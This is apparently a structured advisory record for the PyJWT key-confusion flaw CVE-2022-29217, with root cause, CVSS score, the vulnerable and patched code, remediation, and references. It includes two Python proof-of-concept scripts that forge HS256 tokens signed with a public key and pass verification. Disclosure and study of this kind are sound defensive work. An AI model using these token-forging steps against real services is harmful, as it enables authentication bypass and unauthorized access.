```
{
  "vulnerability": {
    "root_cause": "The PyJWT library incorrectly handles public keys when used with HMAC algorithms. It fails to properly validate that a key intended for asymmetric encryption (like EdDSA or ECDSA with formats such as PEM or OpenSSH) is not misused as a secret for HMAC (symmetric) algorithms.",
    "weaknesses": [
      "Key confusion vulnerability due to insufficient validation of key types."
    ],
    "impact": "An attacker can forge JWT tokens by using a public key as a secret key for HMAC algorithms, bypassing signature verification. This leads to unauthorized access or manipulation of data if the JWT is used for authentication or authorization purposes. This is because the attacker can sign the token with the public key, and the receiver would use the same key to verify.",
    "attack_vectors": "An attacker can exploit this by crafting a JWT with an HMAC algorithm (e.g., HS256) and signing it with a public key (in PEM or OpenSSH format). The vulnerable server, when configured to use `jwt.algorithms.get_default_algorithms()` and processing this token, will incorrectly validate it.",
    "required_attacker_capabilities": "The attacker needs to be able to submit a crafted JWT to the vulnerable system. They also need to know a public key that the server is configured to use, or can otherwise force the server to use. "
  },
  "technical_details": {
    "description": "PyJWT supports multiple JWT signing algorithms. It requires the application to specify the supported algorithms.  If the application uses `jwt.algorithms.get_default_algorithms()` it will enable all algorithms. The library attempts to prevent certain attacks, for example: the 'none' algorithm requires an empty key; and HMAC algorithms will reject keys that look like public keys (e.g. starting with 'ssh-rsa').  However, the library does not properly enforce this for  `ed25519`, allowing public keys to be used with HMAC algorithms. \n\nThis means that if an application receives a token using an HMAC algorithm (e.g. HS256) and it uses a public key as the key, the token would validate.",
    "poc": [
      "```python\nimport jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\n\n# Generate ed25519 private key\nprivate_key = ed25519.Ed25519PrivateKey.generate()\n\n# Get private key bytes as they would be stored in a file\npriv_key_bytes =\nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8,\nencryption_algorithm=serialization.NoEncryption())\n\n# Get public key bytes as they would be stored in a file\npub_key_bytes =\nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\n\n# Making a good jwt token that should work by signing it with the\nprivate key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"EdDSA\")\n\n# Using HMAC with the public key to trick the receiver to think that the\npublic key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, pub_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes,\nalgorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes,\nalgorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n  print(\"POC Successfull\")\n```",
      "```python\nimport jwt\n\n#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem\n#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem\n#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub\n\npriv_key_bytes = b\"\"\"-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49\nAwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk\nAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\n-----END EC PRIVATE KEY-----\"\"\"\n\npub_key_bytes = b\"\"\"-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL\nZr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\n-----END PUBLIC KEY-----\"\"\"\n\nssh_key_bytes = b\"\"\"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc=\"\"\"\n\n# Making a good jwt token that should work by signing it with the private key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"ES256\")\n\n# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, ssh_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n    print(\"POC Successfull\")\nelse:\n    print(\"POC Failed\")\n```"
    ],
    "affected_code": "The vulnerability is in how the `prepare_key` function within the `OKPAlgorithm` class in `jwt/algorithms.py` handles key formats. It incorrectly loads public keys from PEM/OpenSSH formats and allows them to be used with HMAC algorithms due to insufficient type checking. The relevant part of the code is:\n```python\n        if isinstance(\n            key,\n            (Ed25519PrivateKey, Ed25519PublicKey, Ed448PrivateKey, Ed448PublicKey),\n        ):\n            return key\n\n        if isinstance(key, (bytes, str)):\n            if isinstance(key, str):\n                key = key.encode(\"utf-8\")\n            str_key = key.decode(\"utf-8\")\n\n            if \"-----BEGIN PUBLIC\" in str_key:\n                return load_pem_public_key(key)\n            if \"-----BEGIN PRIVATE\" in str_key:\n                return load_pem_private_key(key, password=None)\n            if str_key[0:4] == \"ssh-\":\n                return load_ssh_public_key(key)\n```",
    "patched_code": "The fix involves adding an explicit check to prevent public keys from being used with HMAC algorithms. It ensures that only symmetric keys (or an empty key for the 'none' algorithm) can be used with HMAC.\nThis is done by modifying the `prepare_key` function in the `HMACAlgorithm` class to check if the key is a PEM or SSH key format and raise an `InvalidKeyError`.\n```python\n    def prepare_key(self, key):\n        key = force_bytes(key)\n\n        if is_pem_format(key) or is_ssh_key(key):\n            raise InvalidKeyError(\n                \"The specified key is an asymmetric key or x509 certificate and\"\n                \" should not be used as an HMAC secret.\"\n            )\n\n        return key\n```"
  },
  "remediation": {
    "patches": "Upgrade to `pyjwt` version 2.4.0 or later.",
    "workarounds": "Always explicitly specify the allowed algorithms when decoding JWTs instead of using `jwt.algorithms.get_default_algorithms()`. For example, if you know the algorithm to be used is 'EdDSA', specify algorithms=['EdDSA'] in the `jwt.decode` function. This will prevent the library from trying other algorithms."
  },
    "cvss": {
        "score": 7.4,
        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
      "metrics": {
        "attack_vector": "Network",
        "attack_complexity": "High",
        "privileges_required": "None",
        "user_interaction": "None",
        "scope": "Unchanged",
        "confidentiality": "High",
        "integrity": "High",
        "availability": "None"
      }
    },
  "references": [
    "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24",
    "https://nvd.nist.gov/vuln/detail/CVE-2022-29217",
    "https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc",
        "https://github.com/jpadilla/pyjwt/releases/tag/2.4.0",
    "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2022-202.yaml",
        "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5PK7IQCBVNLYJEFTPHBBPFP72H4WUFNX",
    "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6HIYEYZRQEP6QTHT3EHH3RGFYJIHIMAO"
  ]
}
```